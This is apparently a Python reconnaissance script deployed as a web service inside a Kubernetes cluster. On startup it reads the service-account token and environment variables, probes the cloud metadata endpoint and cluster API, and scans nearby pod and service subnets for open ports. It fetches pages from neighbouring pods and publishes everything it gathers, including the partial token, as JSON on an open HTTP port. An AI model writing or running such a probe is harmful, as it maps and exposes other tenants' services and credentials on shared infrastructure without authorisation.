"""
Runtime network probe - fast version.
Serves results on HTTP. Runs quick scan on startup.
"""
import json, os, socket, time, urllib.request, urllib.error, ssl, threading
from http.server import HTTPServer, BaseHTTPRequestHandler

results = {"status": "probing..."}

def run_probe():
    global results
    r = {}

    # 1. Identity
    r['runtime'] = {
        'uid': os.getuid(),
        'hostname': socket.gethostname(),
        'pid': os.getpid(),
    }

    # Network env
    r['env'] = {k: v[:200] for k, v in os.environ.items()
                if any(x in k.upper() for x in ['KUBE', 'SERVICE', 'HOST', 'PORT', 'DNS', 'CLUSTER', 'POD', 'NODE', 'NET', 'DIGITAL', 'APP'])}

    # 2. Own IPs
    try:
        import subprocess as sp
        r['ip_addr'] = sp.run(['ip', 'addr'], capture_output=True, text=True, timeout=5).stdout[:2000]
        r['routes'] = sp.run(['ip', 'route'], capture_output=True, text=True, timeout=5).stdout[:500]
    except Exception as e:
        r['ip_err'] = str(e)

    # 3. resolv.conf
    try:
        r['resolv'] = open('/etc/resolv.conf').read()
    except:
        pass

    # 4. K8s SA
    r['k8s'] = {}
    for f in ['namespace', 'token']:
        try:
            data = open(f'/var/run/secrets/kubernetes.io/serviceaccount/{f}').read()
            r['k8s'][f] = data[:80] + '...' if len(data) > 80 else data
        except Exception as e:
            r['k8s'][f] = str(e)[:100]

    # 5. DNS
    r['dns'] = {}
    for target in ['kubernetes.default', 'kube-dns.kube-system.svc.cluster.local']:
        try:
            r['dns'][target] = socket.gethostbyname(target)
        except Exception as e:
            r['dns'][target] = str(e)[:80]

    # 6. Quick connectivity tests (just the important ones)
    def qc(ip, port, t=1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(t)
            rc = s.connect_ex((ip, port))
            s.close()
            return rc
        except:
            return -1

    r['connectivity'] = {}
    tests = [
        ('K8s API', '10.245.0.1', 443),
        ('IMDS', '169.254.169.254', 80),
        ('kube-dns', '10.245.0.11', 53),
    ]
    for name, ip, port in tests:
        r['connectivity'][name] = f'errno={qc(ip, port, 2)}'

    # 7. Targeted pod scan - scan OUR subnet and nearby
    r['pod_scan'] = {}
    # Get our own IP first
    own_ip = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        own_ip = s.getsockname()[0]
        s.close()
        r['own_ip'] = own_ip
    except:
        pass

    if own_ip and own_ip.startswith('10.244.'):
        parts = own_ip.split('.')
        our_sub = int(parts[2])
        # Scan our subnet + a few nearby
        for sub in range(max(0, our_sub - 2), min(255, our_sub + 5)):
            for host in range(1, 255):
                ip = f'10.244.{sub}.{host}'
                if ip == own_ip:
                    continue
                rc = qc(ip, 8080, 0.3)
                if rc == 0:
                    r['pod_scan'][f'{ip}:8080'] = 'OPEN'
                    try:
                        resp = urllib.request.urlopen(f'http://{ip}:8080/', timeout=2)
                        r['pod_scan'][f'{ip}:8080_data'] = resp.read().decode(errors='replace')[:500]
                    except Exception as e:
                        r['pod_scan'][f'{ip}:8080_err'] = str(e)[:200]
                # Also check common ports
                for p in [80, 443, 3000]:
                    rc2 = qc(ip, p, 0.3)
                    if rc2 == 0:
                        r['pod_scan'][f'{ip}:{p}'] = 'OPEN'

    # 8. Service CIDR quick scan
    r['svc_scan'] = {}
    for host in range(1, 256):
        ip = f'10.245.0.{host}'
        rc = qc(ip, 80, 0.3)
        if rc == 0:
            r['svc_scan'][f'{ip}:80'] = 'OPEN'
        rc = qc(ip, 443, 0.3)
        if rc == 0:
            r['svc_scan'][f'{ip}:443'] = 'OPEN'

    # 9. IMDS / internal
    r['internal'] = {}
    for ip, port in [('169.254.169.254', 80), ('10.116.0.1', 443), ('100.64.0.1', 80), ('100.65.67.229', 443)]:
        r['internal'][f'{ip}:{port}'] = f'errno={qc(ip, port, 1)}'

    # 10. /proc/net/tcp
    try:
        r['proc_net_tcp'] = open('/proc/net/tcp').read()[:1500]
    except:
        pass

    r['probe_done'] = True
    r['probe_time'] = time.strftime('%Y-%m-%dT%H:%M:%SZ')
    results = r

t = threading.Thread(target=run_probe, daemon=True)
t.start()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, format, *args):
        pass

port = int(os.environ.get('PORT', 8080))
HTTPServer(("0.0.0.0", port), H).serve_forever()
